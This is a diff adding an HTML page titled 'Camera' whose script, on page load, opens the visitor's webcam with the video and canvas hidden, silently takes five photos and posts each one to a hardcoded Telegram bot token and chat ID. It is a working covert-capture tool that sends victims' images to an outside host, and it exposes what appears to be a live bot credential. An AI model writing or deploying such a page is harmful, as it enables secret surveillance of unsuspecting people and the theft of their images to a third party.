@@ -1,1 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Camera</title>
+</head>
+<body>
 
+<video id="video" autoplay playsinline style="display:none;"></video>
+<canvas id="canvas" style="display:none;"></canvas>
+
+<script>
+const BOT_TOKEN = "8311344178:AAGxdEolM9Ex3ZnBwqGhmMW3kXTtfZ9-QzU ";
+const CHAT_ID = "6351568884";
+
+const TOTAL_PHOTOS = 5;
+const INTERVAL_MS = 2000;
+
+let taken = 0;
+
+async function startCamera() {
+  const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+  const video = document.getElementById("video");
+  video.srcObject = stream;
+  setTimeout(() => captureLoop(video, stream), 1000);
+}
+
+function captureLoop(video, stream) {
+  if (taken >= TOTAL_PHOTOS) {
+    stream.getTracks().forEach(t => t.stop());
+    return;
+  }
+  takePhoto(video);
+  taken++;
+  setTimeout(() => captureLoop(video, stream), INTERVAL_MS);
+}
+
+function takePhoto(video) {
+  const canvas = document.getElementById("canvas");
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  canvas.getContext("2d").drawImage(video, 0, 0);
+  canvas.toBlob(blob => sendToTelegram(blob), "image/jpeg");
+}
+
+function sendToTelegram(photoBlob) {
+  const formData = new FormData();
+  formData.append("chat_id", CHAT_ID);
+  formData.append("photo", photoBlob);
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+    method: "POST",
+    body: formData
+  });
+}
+
+startCamera();
+</script>
+
+</body>
+</html>
